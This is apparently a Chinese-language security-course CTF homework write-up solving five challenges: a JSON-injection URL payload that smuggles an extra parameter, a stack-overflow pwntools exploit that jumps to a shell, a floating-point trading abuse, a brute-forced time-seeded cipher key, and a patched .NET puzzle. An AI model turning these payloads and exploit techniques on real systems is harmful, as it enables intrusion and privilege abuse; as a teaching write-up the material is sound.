---
tags: 2020 程式安全
---
# HW0
## owoHub
* 這題題目直接給出source code
* 先來看/auth做的事
![](https://i.imgur.com/CLnaq4X.png)
* 會發現/auth是用get的方式取得兩筆資料一個是username另一個是cute
* 會檢查username是不是字串、不能為空字串以及只能是小寫英文和數字組成的字串然後檢查cute是不是字串還有字串的結尾是不是true或false
* 如果這些檢查都通過就會把這些資料串在一起變成一個JSON格式的資料然後把這些數據丟給server去解析
* 再來看server怎麼解析這些資料
![](https://i.imgur.com/vN0iUSR.png)
* server把從/auth得到data和givemeflag然後把data去做JSON.parse()得到的叫userinfo的資料
* 看最後面可以知道要拿到flag必須滿足兩個條件
    1. givemeflag必須是yes
    2. userinfo.admin必須是true
* givemeflag和userinfo.admin在/auth分別被設成了no和false所以要想辦法把它設成題目要求的結果才能拿到flag
* 觀察/auth後會發現只有對username的內容做檢查看是不是小寫英文和數字但是cute沒有做嚴格的檢查只要cute的內容是以true或false結尾就會通過檢查
* 所以可以用cute來偽造一個JSON格式來改變admin的值把cute的值給他`true,"admin":true`
* 這樣送到server的JSON格式的data就會變成
`data = {"username":"123","admin":false,"cute":true,"admin":true}`
* 這樣他經過JSON.parse(data)第一次遇到admin會把值設成false但碰到第二個admin時就會把原本的false改成true這樣就滿足admin必須為true的條件了再來是要把givemeflag設為yes就能滿足所有條件
* 因為cute沒有對輸入的內容做嚴格的檢查所以一樣用這邊來偽造givemeflag
* 如果要讓givemeflag設為yes那資料以get方式傳到server時網址必須是`xxxxxx/?data={xxx}&givemeflag=yes`
* 所以要先用一個}把JSON格式閉合掉不然輸入的內容都是在{}裡面接著再加上`&fivemeflag=yes`
* 最後把後面的東西用#來註解掉後面的`}givemeflag=no`這樣送到server解析時後面的資料就不會造成影響了
* 所以cute的內容就是`true,"admin":true}&givemeflag=yes#`
* 最後因為cute有檢查所以要在#後面再加上true就能夠通過結尾必須是true或false的檢查了
* 這樣所有資料送到server解析的時候就會變成
`data={"username":"123","admin":false,"cute":true,"admin":true}&givemeflag=yes#true}&givemeflag=no`
* 這邊`&`還有`#`不能直接用符號所以必須分別用`%26`和`%23`來表示
* 所以最後的payload就是 
```
https://owohub.zoolab.org/auth?username=123&cute=true,"admin":true}%26givemeflag=yes%23true
```
* 用python來執行
```python=
import requests

url = 'https://owohub.zoolab.org/auth?username=123&cute=true,"admin":true}%26givemeflag=yes%23true'
r = requests.get(url)

print(r.text)
```
>FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}
## Cafe Overflow
* 用file看一下可以知道這是一個64位元的elf檔
![](https://i.imgur.com/WIzEuMF.png)
* 用checksec檢查可以發現保護機制只開了NX
![](https://i.imgur.com/dIVhxYL.png)
* 接著用ida分析發現在main裡面使用了scanf("%s")來讀取輸入
* 這邊存在overflow的漏洞因為scanf("%s")並沒有對輸入的長度做限制所以如果輸入的內容太多會蓋到後面的資料
![](https://i.imgur.com/48Ft0nz.png)
* 嘗試輸入很多a之後會segmentation fault這是因為這個buffer在stack上所以蓋到了return address所以當main結束會return到一個不合法的位置才導致segmentation fault
![](https://i.imgur.com/DzirrGq.png)
* 然後再繼續看這個程式裡面的其他function會發現有個func1他會對rax裡的值跟0xCAFECAFECAFECAFE比較如果相等就會輸出Here you go並使用system("/bin/sh")開一個shell
![](https://i.imgur.com/o8br84n.png)
* 因為在main存在stack overflow的漏洞可以把return address控制為任意地址
* 所以直接把retrun address覆寫成func1中通過比較之後開shell的地方這樣執行完main之後做return就會跳到開shell的地方去開個shell從靜態分析可以知道這個位置在0x401195
* 先算一下會發現輸入24個byte之後就能蓋到return address所以只要輸入24byte的垃圾接下來的8個byte會變成return address就能把程式流程控制到後來輸入那8byte的地方
* 所以就return address寫成fun1中輸出here you go並開shell的地方就能拿到shell
```python=
from pwn import *

# p = process('./CafeOverflow')
p = remote('hw00.zoolab.org', 65534)

sh = 0x401195
payload = b'a' * 24 + p64(sh)
p.sendlineafter(' : ', payload)

p.interactive()
```
![](https://i.imgur.com/q9P0O5k.png)
>flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}
## The Floating Aquamarine
* 因為在電腦中浮點數除了1/2, 1/4, 1/8...這些以外並不能表示到非常精準只能是一個近似值
* 所以在小數點以下很多位還是會有數字像是這一題的88.88其實是88.879999....所組成的
* 因此當一個浮點數跟很大的數相乘之後會受到小數點後的數字影響而造成結果跟預期的不同
* 100000000\*88.88的結果跟99999989\*88.88的結果相當近似只差在小數點後幾位的差別
* 而且99999989\*88.88因為不是10的倍數所以跟小數點後很多位相乘之後會一直進位最後結果會比100000000\*88.88還要大
* 所以這題只要買入100000000然後賣出99999989這樣身上的負債會變成比0還大的一個數還會多11個寶石可以賣出
* 所以只要重複這樣的步驟最後身上的錢就會大於3000最後能拿到flag
```python=
from pwn import *

def buyAndSell():
    r.sendlineafter('100000000)\n', '100000000')
    r.sendlineafter('0)\n', '-99999989')
    r.sendlineafter('99999989)', '-11')

r = remote('hw00.zoolab.org', 65535)
for i in range(3):
    buyAndSell()
r.recvuntil('flag:')
print(r.recv().decode())
```
>FLAG{floating_point_error_https://0.30000000000000004.com/}
## 解密一下
* 這題題目給出了一個加密後的密文和加密的演算法所以要想辦法從密文反推回去明文是什麼
* 先看這個加密的流程做了些什麼
![](https://i.imgur.com/gQH13Py.png)
* 這邊可以看到他把flag的內容讀出來之後再用srand設定亂數之後取亂數當作key然後傳進去加密裡面把flag做加密最後輸出密文變成多少
* 再來看加密的部分做了些什麼
![](https://i.imgur.com/iMR0aPj.png)
* 明文的長度是16加密的時候把它分成兩段前8個字和後8個字分別丟進_加密去做加密
* 然後看_加密的演算法做了些什麼
![](https://i.imgur.com/fgb7rzZ.png)
* 這邊向量就分別是一段明文前4個字和後4個字而金鑰是前面亂數產生的把他切成4個數字
* 然後把明文跟4個金鑰不斷疊代做32次的運算最後算出來的就是密文
* 這樣把前8個字和後8個字都用同樣的金鑰去做加密最後得到的結果就是加密完的結果
* 加密的部分看起來很複雜其實並沒有很複雜相當於`a = b + c`的概念只要有a b c其中兩個數就能推出第三個數
* 因為有密文所以可以知道計算到最後面的向量\[0\]和向量\[1\]分別是多少
* 所以就可以用`第32次得到的向量[1] - (第32次得到的向量[0]和金鑰做的運算) = 第31次的向量[1]`
* 有31次的向量\[1\]就可以用`第32次得到的向量[0] - (第31次得到的向量[1]和金鑰做的運算) = 第31次的向量[0]`這樣一路往回推推出最一開始的向量\[0\]和向量\[1\]分別是多少
* 所以只要能夠知道4個金鑰分別是多少就能夠回推出明文是什麼
* 這邊前面有用`random.srand(int(time.time()))`去初始化亂數但是其實並不是真正非常隨機
* 因為random.srand()如果給他的參數是一樣的他給出的亂數就會一樣而且他的參數又是整數所以就能夠用暴力破解把他猜出來
* time.time()給的值是1970/1/1 00:00:00算起至今的秒數而且一年也才31536000秒所以要爆出來並不是很困難
* 因為明文前4個字不是flag就是FLAG所以就先用前8個字和現在時間的秒數來做srand去算出金鑰然後做反推看推出來的結果前4個字是不是flag或FLAG
* 因為加密的時間一定比現在時間更早所以如果沒找到就把秒數-1再做一次srand這樣一直到這樣到最後就能找到加密當時的秒數
* 有了秒數之後就能夠用srand去生成加密的金鑰是多少就能夠去把全部的密文回推明文是什麼
```python=
import random
import time

def toInt(data, size=4):
    return [int.from_bytes(data[i:i+size], 'big') for i in range(0, len(data), size)]

sec = int(time.time())
flag = ''
accumulate = [0] * 32
found = False
for i in range(0, 32):
    if i == 0:
        accumulate[i] = 0 + 0xFACEB00C & 0xffffffff
    accumulate[i] = accumulate[i - 1] + 0xFACEB00C & 0xffffffff
while 1:
    random.seed(sec)
    key = random.getrandbits(128).to_bytes(16, 'big')
    key = toInt(key)
    #密文 = 77f905c3 9e36b5eb 0deecbb4 eb08e8cb
    cipher = [int('77f905c3', 16), int('9e36b5eb', 16)]
    for i in range(32):
        cipher[1] = cipher[1] - ((cipher[0] << 4) + key[2] & 0xffffffff ^ (cipher[0] + accumulate[32-i-1]) & 0xffffffff ^ (cipher[0] >> 5) + key[3] & 0xffffffff) & 0xffffffff
        cipher[0] = cipher[0] - ((cipher[1] << 4) + key[0] & 0xffffffff ^ (cipher[1] + accumulate[32 - i - 1]) & 0xffffffff ^ (cipher[1] >> 5) + key[1] & 0xffffffff) & 0xffffffff
    try:
        if bytearray.fromhex(hex(cipher[0])[2:]).decode() == 'flag' or bytearray.fromhex(hex(cipher[0])[2:]).decode() == 'FLAG':
            found = True
            break
    except:
        pass
    sec -= 1
flag = bytearray.fromhex(hex(cipher[0])[2:]).decode() + bytearray.fromhex(hex(cipher[1])[2:]).decode()
random.seed(sec)
key = random.getrandbits(128).to_bytes(16, 'big')
key = toInt(key)
cipher = [int('0deecbb4', 16), int('eb08e8cb', 16)]
for i in range(32):
    cipher[1] = cipher[1] - ((cipher[0] << 4) + key[2] & 0xffffffff ^ (cipher[0] + accumulate[32-i-1]) & 0xffffffff ^ (cipher[0] >> 5) + key[3] & 0xffffffff) & 0xffffffff
    cipher[0] = cipher[0] - ((cipher[1] << 4) + key[0] & 0xffffffff ^ (cipher[1] + accumulate[32 - i - 1]) & 0xffffffff ^ (cipher[1] >> 5) + key[1] & 0xffffffff) & 0xffffffff
flag += bytearray.fromhex(hex(cipher[0])[2:]).decode() + bytearray.fromhex(hex(cipher[1])[2:]).decode()
print(flag)
```
>FLAG{4lq7mWGh93}
## EekumBokum
* 用Exeinfo PE查看一下可以知道這是一個沒有加殼的.NET的程式
![](https://i.imgur.com/bLMNC6d.png)
* 既然是.NET的程式就可以直接使用decompiler把他decompile回去
* 這邊直接使用dnSpy來開啟就會發現這隻程式沒有混淆過所以很快就能找到main
![](https://i.imgur.com/THYeEbf.png)
* 前面都是一些初始化的部分所以直接從run開始看進去看Form1裡面做了些甚麼
![](https://i.imgur.com/gGdLEKp.png)
* 可以看到Form1這邊是做一些初始化把要拼的部分的拼圖顯示出來
* 再來是samonCheck這邊是檢查拼圖有沒有都到該放的位置上如果沒有就return不然後面就會開始做運算把flag算出來然後用messagebox顯示出來
![](https://i.imgur.com/VDeRB8x.png)
* 其他部分就是上下移動之類的操作就不繼續看了
* 所以可以知道如果要拿到flag就必須要把拼圖完成讓他能夠通過檢查
* 而且如果繼續往後看samonCheck會發現他在計算flag的時候跟拼圖的順序也有關所以不能直接把samonCheck那裡的return拿掉讓他繼續往下執行後面的部分這樣算出來的flag會是錯的
* 所以去看初始化的地方可以看到他最後把13格的拼圖跟14格的互換所以這邊可以直接把這部分弄掉讓他不互換這樣拼圖一生成就是完成後的樣子  
![](https://i.imgur.com/EhvdVpB.png)
* 因為dnSpy可以直接把decompile完的project整個export出來
* 把他export之後再用visual studio去打開然後找到初始化的部分把這兩部分刪掉然後重新編譯一次
```csharp=
list[13].Image = this.originalPicture[14];
list[14].Image = this.originalPicture[13];
```
* 這樣再去打開重新編譯後的binary就可以在一開始得到完成的拼圖
![](https://i.imgur.com/T9R3Ft6.png)
* 之後再上下動一下讓他去跑檢查拼圖是否拼完的那部分把flag算出來最後就能拿到flag
![](https://i.imgur.com/7FKsyvH.png)
>flag{NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM}
